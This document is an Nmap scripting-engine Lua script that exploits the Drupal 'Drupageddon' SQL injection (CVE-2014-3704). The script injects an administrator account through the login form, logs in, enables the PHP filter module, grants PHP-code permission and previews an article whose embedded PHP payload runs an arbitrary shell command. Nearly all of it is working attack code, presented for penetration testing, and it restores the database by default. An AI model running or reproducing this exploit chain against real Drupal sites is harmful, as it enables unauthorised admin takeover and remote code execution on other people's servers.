local bit = require "bit"
local http = require "http"
local math = require "math"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local url = require "url"
local vulns = require "vulns"
local re = require "re"
local openssl = require "openssl"

description = [[
Exploits CVE-2014-3704 also known as 'Drupageddon' in Drupal. Versions < 7.32
of Drupal core are known to be affected.

Vulnerability allows remote attackers to conduct SQL injection attacks via an
array containing crafted keys.

The script injects new Drupal administrator user via login form and then it
attempts to log in as this user to determine if target is vulnerable. If that's
the case following exploitation steps are performed:

* PHP filter module which allows embedded PHP code/snippets to be evaluated is enabled,
* permission to use PHP code for administrator users is set,
* new article which contains payload is created & previewed,
* cleanup: by default all DB records that were added/modified by the script are restored.

Vulnerability originally discovered by Stefan Horst from SektionEins.

Exploitation technique used to achieve RCE on the target is based on exploit/multi/http/drupal_drupageddon Metasploit module.
]]

---
-- @usage
-- nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal" <target>
-- nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.uri="/drupal",http-vuln-cve2014-3704.cleanup=false <target>
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-cve2014-3704:
-- |   VULNERABLE:
-- |   Drupal - pre Auth SQL Injection Vulnerability
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2014-3704
-- |       The expandArguments function in the database abstraction API in
-- |       Drupal core 7.x before 7.32 does not properly construct prepared
-- |       statements, which allows remote attackers to conduct SQL injection
-- |       attacks via an array containing crafted keys.
-- |
-- |     Disclosure date: 2014-10-15
-- |     Exploit results:
-- |       Linux debian 3.2.0-4-amd64 #1 SMP Debian 3.2.51-1 x86_64 GNU/Linux
-- |     References:
-- |       https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
-- |       https://www.drupal.org/SA-CORE-2014-005
-- |       http://www.securityfocus.com/bid/70595
-- |_      https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3704
--
-- @args http-vuln-cve2014-3704.uri Drupal root directory on the website. Default: /
-- @args http-vuln-cve2014-3704.cmd Shell command to execute. Default: nil
-- @args http-vuln-cve2014-3704.cleanup Indicates whether cleanup (removing DB
--                                      records that was added/modified during
--                                      exploitation phase) will be done.
--                                      Default: true
---

author = "Mariusz Ziulek <mzet()owasp org>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive", "exploit"}

portrule = shortport.http

--- Appends a new multipart/form-data part to a table
local function multipart_append_data(r, k, data, extra)
  r[#r + 1] = string.format("content-disposition: form-data; name=\"%s\"", k)
  if extra.filename then
    r[#r + 1] = string.format("; filename=\"%s\"", extra.filename)
  end
  if extra.content_type then
    r[#r + 1] = string.format("\r\ncontent-type: %s", extra.content_type)
  end
  if extra.content_transfer_encoding then
    r[#r + 1] = string.format("\r\ncontent-transfer-encoding: %s", extra.content_transfer_encoding)
  end
  r[#r + 1] = string.format("\r\n\r\n%s\r\n", data)
end

--- Creates multipart/form-data message as defined in RFC 2388
local function multipart_build_body(content, boundary)
  local r = {}
  local k, v
  for k, v in pairs(content) do
    r[#r + 1] = string.format("--%s\r\n", boundary)
    if type(v) == "string" then
      multipart_append_data(r, k, v, {})
    elseif type(v) == "table" then
      if v.data == nil then return nil end
      local extra = {
        filename = v.filename or v.name,
        content_type = v.content_type or v.mimetype or "application/octet-stream",
        content_transfer_encoding = v.content_transfer_encoding or "binary",
      }
      multipart_append_data(r, k, v.data, extra)
    else
      return nil
    end
  end

  r[#r + 1] =  string.format("--%s--\r\n", boundary)
  return table.concat(r)
end

local function extract_CSRFtoken(content)
  local pattern = 'name="form_token" value="(.-)"'
  local value = string.match(content, pattern)
  return value
end

local function itoa64(index)
  local itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
  return string.sub(itoa64, index + 1, index + 1)
end

local function phpass_encode64(input)
  local count = #input + 1
  local out = {}
  local cur = 1

  while cur < count do
    local value = string.byte(input, cur)
    cur = cur + 1
    table.insert(out, itoa64(bit.band(value, 0x3f)))

    if cur < count then
      value = bit.bor(value, bit.lshift(string.byte(input, cur), 8))
    end
    table.insert(out, itoa64(bit.band(bit.rshift(value, 6), 0x3f)))

    if cur >= count then
      break
    end
    cur = cur + 1

    if cur < count then
      value = bit.bor(value, bit.lshift(string.byte(input, cur), 16))
    end
    table.insert(out, itoa64(bit.band(bit.rshift(value, 12), 0x3f)))

    if cur >= count then
      break
    end
    cur = cur + 1

    table.insert(out, itoa64(bit.band(bit.rshift(value, 18), 0x3f)))
  end

  return table.concat(out)
end

local function gen_passwd_hash(passwd)
  local iter = 15
  local iter_char = itoa64(iter)
  local iter_count = math.pow(2, iter)
  local salt = stdnse.generate_random_string(8)

  local md5 = openssl.md5(salt .. passwd)
  for i = 1, iter_count do
    md5 = openssl.md5(md5 .. passwd)
  end

  local dgst = phpass_encode64(md5)
  local h = '$P$' .. iter_char .. salt .. string.sub(dgst, 0, 22)
  return h
end

local function do_sql_query(host, port, uri, user)

  local adminRole = 'administrator'
  local sql_user
  local sql_admin
  local passwd
  local email
  local passHash
  local query

  if user == nil then
    user = stdnse.generate_random_string(10)
    passwd = stdnse.generate_random_string(10)
    passHash = gen_passwd_hash(passwd)
    email = stdnse.generate_random_string(8) .. '@' .. stdnse.generate_random_string(5) .. '.' .. stdnse.generate_random_string(3)

    stdnse.debug(1, string.format("adding admin user (username: '%s'; passwd: '%s')", user, passwd))
    sql_user = url.escape("insert into users (uid,name,pass,mail,status) select max(uid)+1,'" .. user .. "','" .. passHash .. "','" .. email .. "',1 from users;")

    sql_admin = url.escape("insert into users_roles (uid, rid) VALUES ((select uid from users where name='" .. user .. "'), (select rid from role where name = '" .. adminRole .. "'));")

    query = sql_user .. sql_admin
  else
    stdnse.debug(1, string.format("removing admin user (username: '%s')", user))

    sql_user = url.escape("delete from users where name='" .. user .. "';")

    sql_admin = url.escape("delete from users_roles where uid=(select uid from users where name='" .. user .. "');")

    query = sql_admin .. sql_user
  end

  local r = "name[0;" .. query .. "#%20%20]=" .. stdnse.generate_random_string(10) .. "&name[0]=" .. stdnse.generate_random_string(10) .. "&pass=" .. stdnse.generate_random_string(10) .. "&form_id=user_login&op=Log+in"

  local opt = {
    header = {
      ['Content-Type'] = "application/x-www-form-urlencoded"
    }
  }
  local res = http.post(host, port, uri .. "/user/login", opt, nil, r)
  --TODO: Check return status

  return user, passwd
end

local function set_php_filter(host, port, uri, session, disable)

  -- enable PHP filter
  if not disable then
    stdnse.debug(1, "enabling PHP filter module")
  else
    stdnse.debug(1, "disabling PHP filter module")
  end

  local opt = {}
  opt['cookies'] = session.name ..'='.. session.value

  local res = http.get(host, port, uri .. "/admin/modules", opt)
  if res == nil then return nil end

  local csrfToken = extract_CSRFtoken(res.body)

  local enabledModulesPattern = 'name="([^"]*)" value="1" checked="checked" class="form%-checkbox"'
  local data = {}
  for m in string.gmatch(res.body, enabledModulesPattern) do
    data[m] = 1
    if disable and m == 'modules[Core][php][enable]' then
      data[m] = nil
    end
  end

  if not disable then
    data['modules[Core][php][enable]'] = 1
  end
  data['form_token'] = csrfToken
  data['form_id'] = 'system_modules'
  data['op'] = 'Save configuration'
  res = http.post(host, port, uri .. "/admin/modules/list/confirm", opt, nil, data)
  if res == nil then return nil end

  return true
end

local function set_permission(host, port, uri, session, disable)

  -- allow Administrator to use php_code
  if not disable then
    stdnse.debug(1, "setting permissions for PHP filter module")
  else
    stdnse.debug(1, "restoring permissions for PHP filter module")
  end

  local opt = {}
  opt['cookies'] = session.name ..'='.. session.value

  local res = http.get(host, port, uri .. "/admin/people/permissions", opt)
  if res == nil then return nil end

  local csrfToken = extract_CSRFtoken(res.body)

  local enabledPermsRegex = 'name="([^"]*)" value="([^"]*)" checked="checked"'
  local data = {}
  for key, value in string.gmatch(res.body, enabledPermsRegex) do
    data[key] = value
    if disable and key == '3[use text format php_code]' then
      data[key] = nil
    end
  end

  if not disable then
    data['3[use text format php_code]'] = 'use text format php_code'
  end
  data['form_token'] = csrfToken
  data['form_id'] = 'user_admin_permissions'
  data['op'] = 'Save permissions'
  res = http.post(host, port, uri .. "/admin/people/permissions", opt, nil, data)
  if res == nil then return nil end

  return true
end

local function trigger_exploit(host, port, uri, session, cmd)

  local opt = {}
  opt['cookies'] = session.name ..'='.. session.value

  -- add new Content page & trigger RCE
  stdnse.debug(1, string.format("%s", "creating new article page with planted payload"))

  local res = http.get(host, port, uri .. "/node/add/article", opt)
  if res == nil then return nil end

  local csrfToken = extract_CSRFtoken(res.body)

  stdnse.debug(1, string.format("%s", "calling preview article page & triggering exploit"))
  local pattern = '"' .. stdnse.generate_random_string(5)
  local payload = "<?php echo '" .. pattern .. " '; system('" .. cmd .. "'); echo '".. pattern .. " '; ?>"
  local boundary = stdnse.generate_random_string(16)
  opt['header'] = {}
  opt['header']["Content-Type"] = "multipart/form-data" .. "; boundary=" .. boundary

  local files = {
    ['title'] = 'title',
    ['form_id'] = 'article_node_form',
    ['form_token'] = csrfToken,
    ['body[und][0][value]'] = payload,
    ['body[und][0][format]'] = 'php_code',
    ['op'] = 'Preview',
  }
  local body = multipart_build_body(files, boundary)

  res = http.post(host, port, uri .. "/node/add/article", opt, nil, body)
  if res == nil then return nil end

  return res.body, pattern
end

action = function(host, port)

  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or '/'
  local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or nil
  local cleanup = nil
  if stdnse.get_script_args(SCRIPT_NAME..".cleanup") == "false" then
    cleanup = "false"
  end

  local user, passwd = do_sql_query(host, port, uri, nil)

  stdnse.debug(1, string.format("logging in as admin user (username: '%s'; passwd: '%s')", user, passwd))
  local data = {
    ['name'] = user,
    ['pass'] = passwd,
    ['form_id'] = 'user_login',
    ['op'] = 'Log in',
  }

  local res = http.post(host, port, uri .. "/user/login", nil, nil, data)

  if res.status == 302 and res.cookies[1].name ~= nil then
    local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
    local vuln = {
      title = 'Drupal - pre Auth SQL Injection Vulnerability',
      state = vulns.STATE.NOT_VULN,
      description = [[
The expandArguments function in the database abstraction API in
Drupal core 7.x before 7.32 does not properly construct prepared
statements, which allows remote attackers to conduct SQL injection
attacks via an array containing crafted keys.
      ]],
      IDS = {CVE = 'CVE-2014-3704'},
      references = {
        'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html',
        'https://www.drupal.org/SA-CORE-2014-005',
        'http://www.securityfocus.com/bid/70595',
      },
      dates = {
        disclosure = {year = '2014', month = '10', day = '15'},
      },
    }
    stdnse.debug(1, string.format("logged in as admin user (username: '%s'; passwd: '%s'). Target is vulnerable.", user, passwd))
    vuln.state = vulns.STATE.EXPLOIT

    if cmd ~= nil then
      local session = {}
      session.name = res.cookies[1].name
      session.value = res.cookies[1].value

      set_php_filter(host, port, uri, session, false)

      set_permission(host, port, uri, session, false)

      local resp_content, pattern = trigger_exploit(host, port, uri, session, cmd)

      local cmdOut = nil
      for m in string.gmatch(resp_content, pattern .. '([^"]*)' .. pattern) do
        cmdOut = m
        break
      end

      if cmdOut ~= nil then
        vuln.exploit_results = cmdOut
      end

      -- cleanup: restore permission & disable php filter module
      if cleanup == nil then
        set_permission(host, port, uri, session, true)
        set_php_filter(host, port, uri, session, true)
      end
    end

    -- cleanup: remove admin user
    if cleanup == nil then
      do_sql_query(host, port, uri, user)
    end

    return vulnReport:make_output(vuln)
  end
end
